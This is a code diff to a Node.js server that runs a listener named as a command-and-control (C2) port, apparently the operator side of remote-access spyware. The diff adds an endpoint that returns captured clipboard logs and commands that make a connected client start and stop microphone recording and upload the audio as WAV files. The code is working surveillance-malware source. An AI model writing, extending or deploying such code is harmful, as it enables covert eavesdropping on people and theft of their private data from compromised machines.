@@ -132,11 +132,26 @@ const server = https.createServer(options, (req, res) => {
                         res.end('Server error');
                     });
                     break;
-                case '/do':
+                case '/api':
                     req.on('end', () => {
-                        if (so_id && !so_id.destroyed) {
-                            const root = JSON.parse(body);
-                    
+                        const root = JSON.parse(body);
+
+                        if (root.action === 'get_logs') {
+                            fs.readFile(clipboard_log, 'utf8', (err, data) => {
+                                if (err) {
+                                    res.writeHead(500, { 'Content-Type': 'text/plain' });
+                                    res.end('Error read log file');
+                                    return;
+                                }
+                            
+                                res.writeHead(200, { 'Content-Type': 'text/jsonl' });
+                                res.end(data);
+                                });
+                        } else {
+
+                        
+                        
+                        if (so_id && !so_id.destroyed) {                    
                             // Clean previous listeners if necessary
                             so_id.removeAllListeners();
                     
@@ -429,8 +444,105 @@ const server = https.createServer(options, (req, res) => {
                                         res.writeHead(500, { 'Content-Type': 'application/json' });
                                         res.end(JSON.stringify({ status: "error", message: "Stream error" }));
                                     });                                    
-                                }
-                                    break;
+                                } break;
+                                case 'start_record_audio': {
+                                    so_id.write(JSON.stringify({com: 7}) + delmtr);
+
+                                    so_id.on('data', (data) => {
+                                            const pos = data.indexOf(delmtr);
+                                            const status = data.slice(0, pos);
+                                            data = data.slice(pos +3);
+                                            try {
+                                                res.writeHead(200, { 'Content-Type': 'application/json' });
+                                                res.end(status);                                            
+                                            } catch (error) {
+                                                console.error('Error parsing JSON:', error);
+                                                res.writeHead(500, { 'Content-Type': 'application/json' });
+                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
+                                            }
+                                        });
+
+                                    // Handle connection end
+                                    so_id.on('end', () => {
+                                        console.log("Connection ended for start record");
+                                    });
+                    
+                                    // Handle socket errors
+                                    so_id.on('error', (err) => {
+                                        console.error('Stream error:', err);
+                                        res.writeHead(500, { 'Content-Type': 'application/json' });
+                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
+                                    });
+                                } break;
+                                case 'stop_record_audio': {
+                                    so_id.write(JSON.stringify({com: 8}) + delmtr);
+                                    const wav_name = `audio_record_${Math.floor(Date.now() / 1000)}.wav`;
+                                    const writeStream = fs.createWriteStream(adir + wav_name, { flags: 'w' });
+                                    let dataReceived = 0;
+                                    so_id.on('data', (data) => {
+                                        console.log(`Received chunk of ${data.length} bytes`);
+                                        if (data.includes(delmtr)) {
+                                            console.log(data);
+                                            writeStream.end();
+                                        } else {
+                                            writeStream.write(data, (err) => {
+                                                if (err) {
+                                                    console.error('Error writing chunk:', err);
+                                                    so_id.write(JSON.stringify({ status: "error", message: "Error writing file chunk" }));
+                                                    return;
+                                                }
+                                                dataReceived += data.length;
+                                            });                                            
+                                        }
+
+                                    });
+                                    
+                                    // Handle connection end
+                                    so_id.on('end', () => {
+                                        console.log("Connection ended for save audio");
+                                    });
+                    
+                                    // Handle socket errors
+                                    so_id.on('error', (err) => {
+                                        console.error('Stream error:', err);
+                                        res.writeHead(500, { 'Content-Type': 'application/json' });
+                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
+                                    });
+                                    writeStream.on('finish', () => {
+                                        console.log('File write complete');
+                                        res.writeHead(200, { 'Content-Type': 'application/json' });
+                                        res.end(JSON.stringify({ status: "OK", url: '/artifacts/' + wav_name }));
+                                    });
+                                } break;
+                                case 'check_record_status': {
+                                    so_id.write(JSON.stringify({com: 9}) + delmtr);
+
+                                    so_id.on('data', (data) => {
+                                            const pos = data.indexOf(delmtr);
+                                            const status = data.slice(0, pos);
+                                            data = data.slice(pos +3);
+                                            try {
+                                                res.writeHead(200, { 'Content-Type': 'application/json' });
+                                                res.end(status);                                            
+                                            } catch (error) {
+                                                console.error('Error parsing JSON:', error);
+                                                res.writeHead(500, { 'Content-Type': 'application/json' });
+                                                res.end(JSON.stringify({ status: "error", message: "Invalid JSON received" }));
+                                            }
+                                        });
+
+                                    // Handle connection end
+                                    so_id.on('end', () => {
+                                        console.log("Connection ended for check status");
+                                    });
+                    
+                                    // Handle socket errors
+                                    so_id.on('error', (err) => {
+                                        console.error('Stream error:', err);
+                                        res.writeHead(500, { 'Content-Type': 'application/json' });
+                                        res.end(JSON.stringify({ status: "error", message: "Stream error" }));
+                                    });
+                                } break;
                                 default:
                                     console.log(`${root.action} not recognized`);
                                     res.writeHead(400, { 'Content-Type': 'application/json' });
@@ -439,8 +551,9 @@ const server = https.createServer(options, (req, res) => {
                             }
                         } else {
                             res.writeHead(500, { 'Content-Type': 'application/json' });
-                            res.end(JSON.stringify({ status: "error", message: "Client is disconnected" }));
+                            res.end(JSON.stringify({ status: "error", message: "Client is disconnected" })); 
                         }
+                    }
                     });                    
                 break;
             }
@@ -510,7 +623,7 @@ server3.on('error', (err) => {
 
 // Запуск сервера
 server.listen(WEB_PORT, () => {
-    console.log(`WebServer is running at http://172.16.218.140:${WEB_PORT}`);
+    console.log(`WebServer is running at ${WEB_PORT}`);
 });
 
 server2.listen(C2_PORT, () => {
